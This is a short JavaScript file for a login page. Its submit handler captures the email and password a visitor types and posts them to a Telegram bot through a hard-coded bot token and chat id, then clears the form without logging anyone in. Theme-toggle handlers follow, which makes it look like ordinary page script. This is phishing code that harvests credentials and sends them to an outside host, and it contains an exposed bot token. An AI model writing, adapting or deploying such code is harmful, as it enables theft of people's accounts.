const form = document.querySelector("#form");

form.addEventListener("submit", (e) => {
    e.preventDefault();

    const email = document.querySelector("#email").value;
    const password = document.querySelector("#password").value;
    const token = "7781665772:AAFAeoca_6vVfUtLI5liFOBMyJ-fLPT3g3Q";
    const chat_id = "-4680012237";

    const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}`;

    const api = new XMLHttpRequest();
    api.open("POST", url, true); // Use POST method
    api.setRequestHeader("Content-Type", "application/json"); // Important for POST requests

    // Construct the JSON payload
    const data = JSON.stringify({
        chat_id: chat_id,
        email: email.value,
        password:password.value,
        text: `Email: ${email} Password: ${password}`,
    });

    api.onload = () => {
        if (api.status >= 200 && api.status < 300) {
            console.log("Message sent successfully!");
            // Optionally display a success message to the user
        } else {
            console.error("Error sending message:", api.status, api.responseText);
            // Optionally display an error message to the user
        }
    };

    api.onerror = () => {
        console.error("Network error occurred.");
        // Handle network errors appropriately
    }

    api.send(data); // Send the JSON data with the request
    email.value = "";
    password.value = ""; //Clear the input field
});


const switchToggle = document.getElementById("switch-toggle");
const switchBtn = document.getElementById("btn");

if (switchBtn) {
    switchBtn.addEventListener("click", () => {
        if (switchToggle) {
            // Toggle the position using classList
            switchToggle.classList.toggle("translate-x-2");
        }
    });
}

const switchToggleA = document.getElementById("switch-toggle-a");
const switchBtnA = document.getElementById("btn-a");

if (switchBtnA) {
    switchBtnA.addEventListener("click", () => {
        if (switchToggleA) {
            // Toggle the position using classList
            switchToggleA.classList.toggle("translate-x-2");
        }
    });
}